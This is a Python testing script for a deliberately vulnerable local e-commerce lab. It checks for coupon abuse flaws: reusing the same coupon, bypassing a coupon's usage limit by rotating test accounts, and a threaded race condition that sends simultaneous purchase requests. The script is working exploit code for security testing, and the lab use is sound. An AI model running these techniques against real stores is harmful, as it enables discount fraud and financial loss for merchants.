#!/usr/bin/env python3
"""
Business Logic Flaw Testing Script
Test coupon abuse vulnerabilities in the vulnerable e-commerce lab
"""

import requests
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "http://127.0.0.1:5001"

def login_user(username, password):
    """Login and return session cookies"""
    session = requests.Session()
    
    # Get login page first
    session.get(f"{BASE_URL}/login")
    
    # Login
    login_data = {
        'username': username,
        'password': password
    }
    
    response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
    
    if response.status_code == 302:  # Redirect indicates success
        print(f"✅ Successfully logged in as {username}")
        return session
    else:
        print(f"❌ Failed to login as {username}")
        return None

def check_user_balance(session, username):
    """Check user's wallet balance"""
    response = session.get(f"{BASE_URL}/wallet")
    if response.status_code == 200:
        # This is a simple way to extract balance from the response
        # In a real test, you'd parse the HTML properly
        if "Wallet Balance" in response.text:
            print(f"📊 Wallet page accessible for {username}")
            return True
    return False

def attempt_purchase_with_coupon(session, product_id, quantity, coupon_code, thread_id=None):
    """Attempt to purchase a product with a coupon code"""
    purchase_data = {
        'product_id': product_id,
        'quantity': quantity,
        'coupon_code': coupon_code
    }
    
    try:
        response = session.post(f"{BASE_URL}/purchase", data=purchase_data, allow_redirects=False)
        
        thread_info = f"[Thread {thread_id}] " if thread_id else ""
        
        if response.status_code == 302:  # Redirect typically means success
            # Check if redirected to receipt (success) or back to product (failure)
            location = response.headers.get('location', '')
            if '/receipt/' in location:
                print(f"✅ {thread_info}Purchase successful with coupon {coupon_code}!")
                return True, location
            else:
                print(f"❌ {thread_info}Purchase failed with coupon {coupon_code}")
                return False, None
        else:
            print(f"❌ {thread_info}Purchase request failed with status {response.status_code}")
            return False, None
            
    except Exception as e:
        print(f"❌ {thread_info}Error during purchase: {e}")
        return False, None

def test_coupon_reuse_same_user():
    """Test if same user can reuse the same coupon multiple times"""
    print("\n🎫 Testing Coupon Reuse by Same User...")
    
    # Login as testuser
    session = login_user('testuser', 'test')
    if not session:
        return
    
    coupon_code = "SAVE10"  # 10% discount
    product_id = 1  # Laptop Pro
    
    success_count = 0
    for i in range(5):  # Try to use the same coupon 5 times
        print(f"\n--- Attempt {i+1} ---")
        success, receipt_url = attempt_purchase_with_coupon(session, product_id, 1, coupon_code)
        if success:
            success_count += 1
            print(f"🎯 Coupon worked! Receipt: {receipt_url}")
        
        time.sleep(1)  # Small delay between attempts
    
    print(f"\n📊 Result: Coupon worked {success_count}/5 times")
    if success_count > 1:
        print("🚨 VULNERABILITY CONFIRMED: Same user can reuse coupons!")
    else:
        print("✅ Protection working: Coupon reuse prevented")

def test_coupon_usage_limit_bypass():
    """Test if coupon can be used beyond its usage limit"""
    print("\n📈 Testing Coupon Usage Limit Bypass...")
    
    # Create multiple user sessions
    users = [
        ('testuser', 'test'),
        ('john_doe', 'password123'),
        ('jane_smith', 'secret456')
    ]
    
    sessions = []
    for username, password in users:
        session = login_user(username, password)
        if session:
            sessions.append((username, session))
    
    if not sessions:
        print("❌ No user sessions available")
        return
    
    coupon_code = "NEWUSER"  # 15% discount with limit of 20
    product_id = 2  # Smartphone X
    
    success_count = 0
    # Try to exhaust the coupon limit
    for i in range(25):  # Try more than the limit
        username, session = sessions[i % len(sessions)]  # Rotate users
        print(f"\n--- Attempt {i+1} by {username} ---")
        
        success, receipt_url = attempt_purchase_with_coupon(session, product_id, 1, coupon_code)
        if success:
            success_count += 1
            print(f"🎯 Coupon worked for {username}!")
        
        time.sleep(0.5)
    
    print(f"\n📊 Result: Coupon worked {success_count}/25 times")
    if success_count > 20:  # More than the intended limit
        print("🚨 VULNERABILITY CONFIRMED: Usage limit bypassed!")
    else:
        print("✅ Protection working: Usage limit enforced")

def test_race_condition_exploit():
    """Test race condition by sending multiple simultaneous requests"""
    print("\n⚡ Testing Race Condition Exploit...")
    
    session = login_user('testuser', 'test')
    if not session:
        return
    
    coupon_code = "WELCOME20"  # 20% discount
    product_id = 3  # Gaming Mouse
    num_threads = 10
    
    def race_purchase(thread_id):
        return attempt_purchase_with_coupon(session, product_id, 1, coupon_code, thread_id)
    
    # Execute purchases simultaneously
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = [executor.submit(race_purchase, i+1) for i in range(num_threads)]
        results = [future.result() for future in futures]
    
    success_count = sum(1 for success, _ in results if success)
    
    print(f"\n📊 Result: {success_count}/{num_threads} simultaneous purchases succeeded")
    if success_count > 1:
        print("🚨 VULNERABILITY CONFIRMED: Race condition allows multiple coupon uses!")
    else:
        print("✅ Protection working: Race condition prevented")

def check_current_coupon_status():
    """Check current status of coupons in the database"""
    print("\n📋 Checking Current Coupon Status...")
    
    # This would require database access or an API endpoint
    # For now, we'll just make a note
    print("💡 Check coupon status manually in database or admin panel")

def main():
    print("🔥 BUSINESS LOGIC FLAW TESTING SCRIPT")
    print("=" * 50)
    print("🎯 Testing coupon abuse vulnerabilities")
    print("⚠️  Make sure the Flask app is running on port 5001!")
    print("=" * 50)
    
    # Test different business logic vulnerabilities
    test_coupon_reuse_same_user()
    test_coupon_usage_limit_bypass()
    test_race_condition_exploit()
    
    print("\n" + "=" * 50)
    print("🏁 Business Logic Testing Complete!")
    print("💡 Check the database to see coupon usage counts")
    print("🔍 Monitor Flask app logs for purchase attempts")
    print("=" * 50)

if __name__ == "__main__":
    main()
